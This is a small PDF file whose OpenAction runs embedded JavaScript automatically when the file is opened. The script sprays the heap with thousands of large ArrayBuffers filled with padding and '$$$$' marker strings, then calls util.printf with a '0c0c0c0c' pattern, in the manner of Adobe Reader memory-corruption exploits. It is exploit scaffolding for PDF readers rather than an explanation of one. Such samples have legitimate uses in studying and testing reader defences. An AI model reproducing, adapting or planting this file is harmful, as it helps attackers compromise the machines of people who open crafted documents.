%PDF 
1 0 obj
<</Pages 1 0 R /OpenAction 2 0 R>> 
2 0 obj
<</S /JavaScript /JS (
var data_array = new Array();
var baricade = new Array();

function str2ab(str,buf) {
  var bufView = new Uint16Array(buf);
  for (var i=0, strLen=str.length; i<strLen; i++) {
    bufView[i] = str.charCodeAt(i);
  }
  return buf;
}

function f()
{
	for(var i = 0 ; i < 3; i++)
	{
		baricade[i] = new ArrayBuffer(0x1000);
		data_array[i] = new ArrayBuffer(0x40000-0x8);
	}
	baricade[3] = new ArrayBuffer(0x1000);
	for(var i = 0 ; i < 3; i++)
	{
		data_array[i]= null;
	}
	var junkstr = "";
	var smallstr = "";
	var largestr = "";
	var markerstr = "$$$$";
	
	while (junkstr.length < 0xbc4)
	{
		junkstr += "\x20";
	}
	smallstr += junkstr;
	smallstr += markerstr;

	while (smallstr.length < 0x1000)
	{
		smallstr += "\x20";
	}

	while (largestr.length < 0x40000)
	{
		largestr += smallstr;
	}
	for(var i = 0 ; i < 0x2500; i++)
	{
		data_array[i] =  new ArrayBuffer(0x40000-0x8);
		str2ab(largestr.substr(0,0x40000-0x8),data_array[i]);
	}
}

f();
app.alert(util.printf("check it 0c0c0c0c"));

)>> trailer <</Root 1 0 R>>